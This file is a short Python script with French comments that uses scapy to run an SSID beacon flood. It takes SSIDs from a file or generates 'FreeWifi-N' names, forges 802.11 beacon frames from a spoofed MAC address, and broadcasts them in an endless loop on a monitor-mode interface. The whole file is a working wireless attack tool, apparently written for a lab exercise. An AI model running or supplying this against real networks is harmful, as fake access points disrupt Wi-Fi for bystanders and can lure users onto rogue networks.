#! /usr/bin/python3

import sys
from scapy.all import *

if len(sys.argv) != 2:
    print("Error, need 1 parameter.")
    exit(1)



# A modifier si nécessaire
iface = 'wlan0mon'      # interface wlan où les paquets seront envoyés (mode monitor nécessaire)


# Definition des SSIDs à diffuser
ssids = []
userInput = sys.argv[1]
if userInput == "1":        # SSID fournis dans un fichier par le user
    file = input("Enter the file path : ")
    with open(file) as file:
        for line in file:
            ssids.append(line.strip())

elif userInput == "2":      # SSID aléatoires générés
    nbAp = int(input("How many APs to generate ? : "))
    for i in range(nbAp):
        ssids.append("FreeWifi-" + str(i))      # Les SSID seront de type "FreeWifi-X"

else:
    print("Incorrect parameter")
    exit(1)



# Flood SSID
if len(ssids) == 0:
    exit(1)



frames = []
for ssid in ssids:  # Génération des beacons à diffuser
    sender = 'ba:cb:12:ad:32:35'
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=sender, addr3=sender)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    frame = RadioTap() / dot11 / beacon / essid     # On forge la trame avec toutes les couches

    frames.append(frame)

sendp(frames, iface=iface, inter=0.1, loop=1)       # Envoie des beacons en boucle, chaque 0.1s


